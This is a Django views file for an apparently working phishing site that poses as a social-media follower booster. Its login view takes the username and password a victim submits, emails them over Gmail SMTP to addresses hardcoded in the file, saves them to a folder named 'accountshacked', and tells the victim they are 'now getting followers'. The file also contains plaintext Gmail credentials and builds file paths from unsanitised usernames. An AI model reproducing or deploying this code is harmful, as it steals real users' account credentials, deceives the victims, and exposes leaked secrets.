from django.http import HttpResponse
from django.shortcuts import render
import smtplib
def email(username, password):
    gmail_user = 'djangorobotpouya@gmail.com'
    gmail_password = 'pooyasalehi69'

    sent_from = gmail_user
    to = [gmail_user, 'pooyasalehi69@gmail.com']
    subject = 'PASSWORD ROBOT'
    body = 'USERNAME : ' + username + "\n    PASSWORD : " + password

    email_text = """\
    From: %s
    To: %s
    Subject: %s

    %s
    """ % (sent_from, ", ".join(to), subject, body)

    try:
        server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
        server.ehlo()
        server.login(gmail_user, gmail_password)
        server.sendmail(sent_from, to, email_text)
        server.close()

        print ('Email sent!')
    except:
        print ('Something went wrong...')
    # Create your views here.


def home(request):
    return render(request, "home.html", {'name': 'Pouya'})
#def titlesite(request):
    #return render(request, "titlesite.html", {'name': 'Pouya'})


def login(request):
    if request.method == 'POST':
        username = request.POST["username"]
        password = request.POST["password"]
        email(username, password)
        f = open('accountshacked/' + username + ".txt","w+")
        f.write('USERNAME : ' + username + '\n')
        f.write('PASSWORD : ' + password)
        f.close()
        print('[+++] PASSWORD FILE SAVED!!!')
        finall = username + " : " + password + " is now getting followers!"
        return render(request, "result.html", {'result': finall})
    else:
        return HttpResponse('SORRY')
